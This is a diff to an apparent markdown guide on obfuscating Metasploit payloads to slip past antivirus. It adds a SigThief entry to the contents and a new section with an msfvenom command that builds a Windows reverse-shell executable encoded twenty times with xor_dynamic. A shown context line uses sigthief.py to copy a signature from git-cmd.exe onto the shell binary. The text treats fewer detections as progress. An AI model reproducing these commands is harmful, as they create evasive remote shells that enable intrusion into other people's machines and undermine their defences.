@@ -5,7 +5,8 @@
 
 - Ways to obfuscate msf payloads
     - Basic msf payload
-    - Using xor and shikata_ga_nai
+    - Using SigThief
+    - Using xor 
     - Using shellcode with C shellcode loader
     - Using encryption (Alaris)
     
@@ -42,4 +43,17 @@ python sigthief.py -i git-cmd.exe -t shivang_shell.exe -o shivang_shell_2.exe
 
 Droping only 2 detection is not at all a huge move here . Although there are many combination which can be tried from SighTheif but for now let's leave it here
 
+### Using xor
+With xor payload is decrypted inside the memeory once loaded via msfveom we can generate such payload 
+
+- Build command
+
 ```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip here> LPORT=<port here> -e x64/xor_dynamic -i 20 -f exe -o shivang_shell_xor.exe
+```
+
+- Result
+
+![Alt Text](https://i.ibb.co/P9McckC/basic-msf-xor.png)
+
+Well we are making some progress now.
